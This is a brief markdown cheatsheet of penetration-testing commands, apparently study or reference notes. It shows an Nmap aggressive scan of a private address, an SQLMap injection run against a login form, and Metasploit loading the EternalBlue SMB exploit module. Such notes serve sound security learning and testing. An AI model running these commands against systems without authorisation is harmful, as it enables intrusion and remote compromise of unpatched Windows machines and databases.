# 🧰 Tool Cheatsheets

## Nmap
```bash
nmap -sV -A -oN results.txt 192.168.1.5
```

## SQLMap
```bash
sqlmap -u "http://target/login" --data="username=admin&password=123"
```

## Metasploit
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
```
